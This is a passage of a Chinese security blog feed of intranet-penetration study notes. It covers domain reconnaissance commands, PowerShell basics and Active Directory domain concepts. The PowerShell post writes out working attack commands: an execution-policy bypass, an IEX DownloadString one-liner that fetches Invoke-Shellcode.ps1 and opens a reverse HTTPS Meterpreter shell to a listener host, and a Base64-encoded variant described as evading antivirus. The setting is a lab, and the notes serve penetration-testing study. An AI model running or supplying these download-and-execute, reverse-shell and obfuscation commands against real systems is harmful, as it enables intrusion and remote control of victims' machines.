class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>通过该命令，我们一般可以区分出当前用户是属于以下哪种用户：</p><ul><li>本地普通用户</li><li>本地管理员用户</li><li>域内用户</li></ul><p>在这三种情况下，如果当前内网中存在域，那么本地普通用户是查询不到内网域信息的，而只能查询本机相关信息，但是本机管理员用户和域内用户则可以查询域内信息。</p><p>其原理在于：域内的所有查询都是通过DC实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用Kerberos协议进行认证，无须额外输入账号密码。</p><p>本地管理员Administrator权限可以直接提升为Ntauthority或System权限，因此在域中除了普通用户外，所有的机器都有一个机器用户（用户名是机器名加上“$”）。在本质上，机器的System用户对应的就是域里面的机器用户。所以，使用System权限可以运行域内的查询命令。</p><p>比如这里是hacker域内的testuser用户：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/26.png" alt=""></p><h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p>可以看到当前域hacker的SID为S-1-5-21-554479669-3187065311-1765148423，域用户testuser的SID为S-1-5-21-554479669-3187065311-1765148423-1105：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/27.png" alt=""></p><h3 id="查询指定用户的详细信息"><a href="#查询指定用户的详细信息" class="headerlink" title="查询指定用户的详细信息"></a>查询指定用户的详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure><p>输入该命令可以看到当前用户在本地组中有没有本地管理员权限，属于哪个域等。</p><p>这里看到testuser用户在本地组并没有本地管理员权限，在域中属于Domain Users组：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/28.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之Windows PowerShell基础</title>
    <link href="https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell基础/</id>
    <published>2020-02-18T13:51:31.000Z</published>
    <updated>2020-02-27T15:36:06.773Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>主要参考《内网安全攻防》。</p><p>更多PowerShell的内容可参考：<a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">https://www.pstips.net/powershell-online-tutorials</a></p><h2 id="0x01-PowerShell基本概念"><a href="#0x01-PowerShell基本概念" class="headerlink" title="0x01 PowerShell基本概念"></a>0x01 PowerShell基本概念</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p><p>PowerShell需要.NET环境的支持，同时支持.NET对象，其拥有以下特点：</p><ul><li>在Windows 7以上版本是默认安装的；</li><li>脚本可以在内存中运行，不需要写入磁盘；</li><li>几乎不会触发杀毒软件；</li><li>可远程执行；</li><li>目前很多工具都是局域PowerShell开发的；</li><li>使Windows脚本的执行更为容易；</li><li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li><li>可用于管理活动目录；</li></ul><p>通过以下两个命令都可以查看PowerShell的版本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-Host</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">5.1</span>.<span class="number">18362.628</span></span><br><span class="line">InstanceId       : <span class="number">33</span>a7b882-<span class="number">5</span>b06-<span class="number">494</span>a-<span class="number">9577</span>-ed0f51a6e8ad</span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : zh-CN</span><br><span class="line">CurrentUICulture : zh-CN</span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">DebuggerEnabled  : True</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS E:\&gt; <span class="variable">$PSVersionTable</span>.PSVersion</span><br><span class="line"></span><br><span class="line">Major  Minor  Build  Revision</span><br><span class="line">-----  -----  -----  --------</span><br><span class="line"><span class="number">5</span>      <span class="number">1</span>      <span class="number">18362</span>  <span class="number">628</span></span><br></pre></td></tr></table></figure><h2 id="0x02-PowerShell脚本"><a href="#0x02-PowerShell脚本" class="headerlink" title="0x02 PowerShell脚本"></a>0x02 PowerShell脚本</h2><p>PowerShell脚本其实就是一个扩展名为”.ps1”的文件，其中包含一系列PowerShell命令，每个命令显示为独立的一行。</p><h3 id="脚本运行"><a href="#脚本运行" class="headerlink" title="脚本运行"></a>脚本运行</h3><p>运行PowerShell脚本需要输入绝对路径，比如<code>E:\test.ps1</code>。如果PowerShell脚本刚好在系统目录中，则只需要<code>.\test.ps1</code>执行即可，这和Linux上执行Shell脚本是一样的。</p><p>当然，PowerShell是分32位和64位的。在64位的Windows上，同时存在x64和x86两个版本的PowerShell，并且这两个版本的执行策略互不影响，即相互独立。</p><p>x64版本的PowerShell的配置文件在<code>%WinDir%\SysWOW64\WindowsPowerShell\v1.0\</code>目录下。</p><p>运行32位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><p>运行64位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%WinDir%\SysWOW64\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>如果PowerShell脚本不能运行，可以使用如下的cmdlet命令查询当前的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>这里看到是Restricted即限制不能执行的意思。我们看下执行策略的几个值：</p><ul><li>Restricted：脚本不能运行（默认设置）；</li><li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li><li>Unrestricted：允许所有脚本运行；</li></ul><p>可以使用下面的cmdlet命令设置PowerShell的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>在PowerShell中也支持管道符<code>|</code>的使用。</p><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用<code>|</code>连接。</p><h2 id="0x03-PowerShell常用命令与利用技巧"><a href="#0x03-PowerShell常用命令与利用技巧" class="headerlink" title="0x03 PowerShell常用命令与利用技巧"></a>0x03 PowerShell常用命令与利用技巧</h2><p>在Windows命令提示符即cmd.exe中输入<code>powershell</code>命令即可切入PowerShell命令行环境。也可以直接在当前目录Shift+右键&gt;在此处打开PowerShell窗口（win10）。其中输入help命令可以显示帮助菜单：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS E:\&gt; help</span><br><span class="line"></span><br><span class="line">主题</span><br><span class="line">Windows PowerShell 帮助系统</span><br><span class="line"></span><br><span class="line">简短说明</span><br><span class="line">显示有关 Windows PowerShell 的 cmdlet 及概念的帮助。</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在PowerShell中，类似cmd命令的命令称为cmdlet命令。两者的命名规范一致，都采用“动词-名词”的方式，动词部分一般是Add、New、Get、Set、Remove等。命令的别名一般兼容Windows Command和Linux Shell。另外PowerShell命令不区分大小写。</p><p>几个常用命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/4.png" alt=""></p><p>几个常用的文件操作命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/3.png" alt=""></p><p>下面以文件操作为例：</p><ul><li>新建目录：New-ltem whitecellclub-ltemType Directory；</li><li>新建文件：New-ltem light.txt-ltemType File；</li><li>删除目录：Remove-ltem whitecellclub；</li><li>显示文本内容：Get-Content test.txt；</li><li>设置文本内容：Set-Content test.txt-Value ‘’hello,word! ‘’；</li><li>追加内容：Add-Content light.txt-Value ‘’i love you ‘’；</li><li>清除内容：Clear-Content test.txt</li></ul><h3 id="PowerSploit——后渗透测试框架"><a href="#PowerSploit——后渗透测试框架" class="headerlink" title="PowerSploit——后渗透测试框架"></a>PowerSploit——后渗透测试框架</h3><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>它包含以下几个模块：</p><ul><li>CodeExecution：在目标机器执行代码；</li><li>ScriptModification：修改或准备脚本以在受感染的计算机上执行；</li><li>Persistence：向PowerShell脚本添加持久性功能；</li><li>AntivirusBypass：使PowerShell绕过防病毒；</li><li>Exfiltration：窃取数据；</li><li>Mayhem：使用PowerShell引起一般的混乱；</li><li>Privesc：帮助提升目标特权的工具；</li><li>Recon：在渗透测试的侦察阶段提供帮助的工具；</li></ul><h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><p>由前面知道，要想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p><h4 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h4><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="/2020/02/18/Windows-PowerShell基础/1.png" alt=""></p><p>在实际的内网渗透中，将PowerSploit中Privesc模块的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp.ps1脚本</a>上传到目标服务器中，在目标本地执行脚本文件，命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module E:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/2.png" alt=""></p><p>这里PowerUp旨在成为依赖错误配置的常见Windows特权升级向量的交换所。运行Invoke-AllChecks将输出所有可识别的漏洞以及任何滥用功能的规范。换句话说，Invoke-AllChecks函数将检查目标主机的攻击向量以进行权限提升</p><h4 id="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"><a href="#从网站服务器中下载脚本，Bypass本地权限并隐藏执行" class="headerlink" title="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"></a>从网站服务器中下载脚本，Bypass本地权限并隐藏执行</h4><p>下载脚本的命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[Parameters]</span><br></pre></td></tr></table></figure><p>几个常用参数说明如下：</p><p>-ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略，这个参数非常重要。在默认 情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个 参数，可以绕过任意安全保护规则。在渗透测试中，通常每次运行 PowerShell 脚本时都要 使用这个参数；</p><ul><li>-WindowStyle Hidden（-W Hidden）：隐藏窗口；</li><li>-Nonlnteractive（-NonI）：非交互模式。PowerShell不为用户提供交互的提示；</li><li>-NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件；</li><li>-noexit：执行后不退出Shell。这在使用键盘记录等脚本时非常重要；</li><li>-NoLogo：启动不显示版权标志的PowerShell；</li></ul><p>这里使用PowerSploit中CodeExecution模块中<a href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1" target="_blank" rel="noopener">Invoke-Shellcode.ps1</a>脚本在目标机器上执行Meterpreter Shell。</p><p>这里我们需要知道使用什么参数，直接看源码了解如何调用反向HTTPS Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/5.png" alt=""></p><p>因此，最终构造如下payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>先在Kali上打开MSF，使用后门模块<code>exploit/multi/handler</code>，并选择payload为<code>windows/meterpreter/reverse_https</code>，接着设置监听地址和端口后启动监听：</p><p><img src="/2020/02/18/Windows-PowerShell基础/6.png" alt=""></p><p>然后在Win10中的PowerShell中输入payload，发现会报如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/7.png" alt=""></p><p>此时msf是接收到反弹的请求的，但是并不会成功获得反弹的Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/8.png" alt=""></p><p>那我们换个环境，在Win7上测试一下，经过几番折腾，去掉几个payload的参数就能成功执行反弹shell（注意，在cmd命令行下双引号要改为单引号，不然报错）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -NoProfile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>直接在win7的cmd中输入payload：</p><p><img src="/2020/02/18/Windows-PowerShell基础/9.png" alt=""></p><p>此时在Kali的msf中成功获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/10.png" alt=""></p><p>这里注意，不能直接在win7的PowerShell终端输入该payload，会显示如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/11.png" alt=""></p><p>这可能是win7和win10的PowerShell版本不一致导致的某些差异，具体原因还未知，但我们可以使用如下形式在win7的PowerShell终端来执行反弹shell，简单地说就是设置执行策略为无限制，然后直接远程下载恶意PowerShell脚本并执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted; IEX(<span class="built_in">New-object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/12.png" alt=""></p><p>在msf中同样获取到反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/13.png" alt=""></p><h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。这里使用大佬写的一个Python脚本文件<a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py" target="_blank" rel="noopener">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p><p>该脚本编码的对象必须是文本文件，这里需要先将命令保存为文本文件，然后调用该脚本编码即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># echo "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force" &gt;raw.txt</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat raw.txt </span></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force</span><br><span class="line">root@kali:~/Desktop<span class="comment"># chmod +x ps_encoder.py </span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># python ps_encoder.py -s raw.txt</span></span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br><span class="line">root@kali:~/Desktop<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到Base64编码后的命令内容之后，直接在目标主机的cmd终端上执行如下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br></pre></td></tr></table></figure><p>这里为了看下有没有错误就不添加<code>-W Hidden</code>参数设置隐藏窗口了，而且添加了还没成功反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/14.png" alt=""></p><p>然后在Kali的msf中获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/15.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透基础与域环境搭建</title>
    <link href="https://www.mi1k7ea.com/2020/02/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.mi1k7ea.com/2020/02/15/内网渗透基础/</id>
    <published>2020-02-15T12:34:33.000Z</published>
    <updated>2020-03-01T05:07:58.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-内网基本概念"><a href="#0x01-内网基本概念" class="headerlink" title="0x01 内网基本概念"></a>0x01 内网基本概念</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。在这个概念中，并不存在集中管理的节点，即无服务器和客户机的区分。</p><p>怎么设置工作组？——右键我的电脑-&gt;属性-&gt;更改设置-&gt;更改：</p><p><img src="/2020/02/15/内网渗透基础/1.png" alt=""></p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>Windows域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。Windows域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p><p>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p><h4 id="域控制器（DC）"><a href="#域控制器（DC）" class="headerlink" title="域控制器（DC）"></a>域控制器（DC）</h4><p>域控制器（Domain Controller，简写为DC）是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。域内的计算机若想互相访问，需要经过域控制器的审核。域控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p><p><img src="/2020/02/15/内网渗透基础/2.png" alt=""></p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>单域即只有一个域，通常满足小公司的需求。一般来说至少两个域服务器，一台作为DC，另一台作为备份DC。</p><h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>出于管理和其他一些需求，需要在网络中划分多个域。其中第一个域称为父域，各分部的域称为该域的子域。</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p><img src="/2020/02/15/内网渗透基础/3.png" alt=""></p><p>多个域树可以组成一个域林。</p><h4 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h4><p>域林是指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的集合，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p><img src="/2020/02/15/内网渗透基础/4.png" alt=""></p><h4 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h4><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。</p><p>在前面域树中看到域树中的域名和DNS域名很像。因为域中的计算机是使用DNS来定位域控制器、服务器和其他计算机、网络服务的，因此域的名字就是DNS域的名字。</p><p>对于内网渗透而言，一般是通过寻找DNS服务器来确定域控制器的位置的（通常DNS服务器和域控制器配置在同一台机器上）。</p><h4 id="域中计算机的分类"><a href="#域中计算机的分类" class="headerlink" title="域中计算机的分类"></a>域中计算机的分类</h4><p>在域中，计算机一般分为：域控制器、成员服务器、客户机、独立服务器等。</p><p>其中域控制器是域所必需的，因为其存放活动目录数据库。</p><h5 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h5><p>DC的概念在前面已说过。</p><p>可以在网络中配置多态DC，用来分担用户的登录、访问等操作。多个DC可以一起工作，自动备份用户账户和活动目录数据，提高网络的安全性和稳定性。</p><h5 id="成员服务器"><a href="#成员服务器" class="headerlink" 